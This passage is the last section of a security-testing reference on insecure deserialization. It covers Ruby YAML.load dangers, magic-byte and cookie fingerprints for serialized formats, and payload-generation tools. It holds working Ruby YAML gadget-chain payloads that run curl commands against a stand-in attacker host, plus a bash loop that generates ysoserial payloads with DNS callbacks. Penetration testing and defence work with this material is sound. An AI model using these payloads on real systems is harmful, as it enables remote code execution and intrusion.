# deserialization-test · part 4

> 分段 4/4。完整索引见 `deserialization-test.md`。

## 5. RUBY YAML.load vs YAML.safe_load

### 5.1 Why YAML.load Is Dangerous

`YAML.load` in Ruby constructs arbitrary Ruby objects via `!ruby/object:` tags. It is equivalent to `Marshal.load` or Java's `ObjectInputStream.readObject()` in terms of attack surface.

### 5.2 Version-Specific Exploits

**Ruby ≤ 2.7.2** — `Gem::Requirement` chain (simplest):

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| curl http://attacker.com/pwned"
```

**Ruby 2.x–3.x** — `Gem::Installer` chain (complex but broader):

```yaml
--- !ruby/hash:Gem::Installer
i: x
--- !ruby/hash:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: "curl http://attacker.com/$(whoami)"
      method_id: :resolve
```

### 5.3 Detection in the Wild

```ruby
# Vulnerable patterns in source code:
YAML.load(user_input)
YAML.load(File.read(user_controlled_path))
YAML.load(params[:config])

# Safe alternatives:
YAML.safe_load(input)
YAML.safe_load(input, permitted_classes: [Symbol, Date])
Psych.safe_load(input)
```

### 5.4 Psych YAML Parser Versions

| Ruby Version | Psych Version | YAML.load Behavior |
|---|---|---|
| ≤ 2.0 | Psych 2.x | Arbitrary object construction |
| 2.1–2.7 | Psych 3.x | Arbitrary (YAML.load deprecated warning in 2.6+) |
| 3.0 | Psych 3.3 | YAML.load warns, still works |
| 3.1+ | Psych 4.0 | YAML.load defaults to safe_load behavior; need `unsafe_load` |

---
## 6. DETECTION FINGERPRINTS — MAGIC BYTES TABLE

### 6.1 By Protocol / Format

| Magic Bytes (Hex) | Base64 Prefix | Format | Language |
|---|---|---|---|
| `AC ED 00 05` | `rO0AB` | Java Serialized Object | Java |
| `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | .NET BinaryFormatter | .NET |
| `FF 01` | `/w` | .NET ObjectStateFormatter (ViewState) | .NET |
| `80 02` or `80 03` or `80 04` or `80 05` | Varies | Python pickle (protocol 2/3/4/5) | Python |
| `89 50 4E 47` | `iVBOR` | PNG (may contain phar polyglot) | PHP |
| `4F 3A` | `Tz` (base64 of `O:`) | PHP serialized object (`O:N:"Class"`) | PHP |
| `61 3A` | `YT` (base64 of `a:`) | PHP serialized array (`a:N:{`) | PHP |
| `04 08` | Varies | Ruby Marshal | Ruby |
| `1F 8B` | `H4s` | Gzip (may wrap serialized data) | Any |
| `48 02` or `63` | Varies | Hessian (2.0 / 1.0) | Java |

### 6.2 By Content-Type Header

| Content-Type | Likely Format | Risk |
|---|---|---|
| `application/x-java-serialized-object` | Java ObjectOutputStream | Critical |
| `application/x-java-serialized-object-xml` | XMLEncoder/XMLDecoder | Critical |
| `x-application/hessian` | Hessian binary | Critical |
| `application/x-hessian` | Hessian binary | Critical |
| `application/x-amf` | AMF (Flash) — often wraps Java | High |
| `application/x-yaml` / `text/yaml` | YAML (check for `!!` tags) | High (if YAML.load) |
| `application/java-archive` | JAR file | Context-dependent |
| `application/x-protobuf` | Protobuf (generally safe) | Low |
| `application/json` with `$type` | JSON.NET with TypeNameHandling | Critical |
| `application/xml` with suspicious elements | XStream / XMLDecoder | Critical |

### 6.3 By Cookie / Parameter Name

| Name Pattern | Likely Format | Product |
|---|---|---|
| `rememberMe` | Java serialized + AES | Apache Shiro |
| `__VIEWSTATE` | .NET ObjectStateFormatter | ASP.NET WebForms |
| `__EVENTTARGET` | .NET (associated with ViewState) | ASP.NET WebForms |
| `JSESSIONID` + binary cookie | Java serialized | Various Java servers |
| `rack.session` | Ruby Marshal (base64) | Ruby on Rails / Rack |
| `_session_id` + binary | Python pickle or JSON | Django / Flask |
| `connect.sid` | Node.js session (usually JSON, but check) | Express |
| `ci_session` | PHP serialized | CodeIgniter |
| `PHPSESSID` + serialized data | PHP serialized | PHP applications |

### 6.4 Quick Identification Script

```bash
# Check if base64-decoded data matches known magic bytes:
echo "BASE64_DATA" | base64 -d | xxd | head -1

# Java: look for "ac ed 00 05"
# .NET BinaryFormatter: look for "00 01 00 00 00 ff ff ff ff"
# Python pickle: look for "80 0N" where N is protocol version
# PHP: decode and look for "O:" or "a:" prefix
```

---
## 7. TOOLING QUICK REFERENCE

| Tool | Language | Purpose |
|---|---|---|
| **ysoserial** | Java | Java gadget chain payload generation |
| **ysoserial.net** | .NET | .NET gadget chain payload generation |
| **marshalsec** | Java | Hessian, XStream, JNDI, multiple format payloads |
| **PHPGGC** | PHP | PHP gadget chain generation (Laravel, Symfony, etc.) |
| **pimpmykali/ysoserial-modified** | Java | Extended ysoserial with more chains |
| **GadgetInspector** | Java | Automated gadget chain discovery in classpaths |
| **Blacklist3r** | .NET | ViewState key testing and forging |
| **SerializationDumper** | Java | Decode and inspect Java serialized objects |
| **jdeserialize** | Java | Parse Java serialization stream for analysis |

```bash
# ysoserial — try all chains with DNS callback:
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
  CommonsCollections4 CommonsCollections5 CommonsCollections6 \
  CommonsCollections7 CommonsBeanutils1 Spring1 Spring2 \
  Groovy1 Hibernate1 Jdk7u21 URLDNS; do
  java -jar ysoserial.jar $chain "http://${chain}.TOKEN.collab.net" 2>/dev/null | \
    base64 -w0 > "${chain}.b64"
  echo "Generated: ${chain}"
done
```
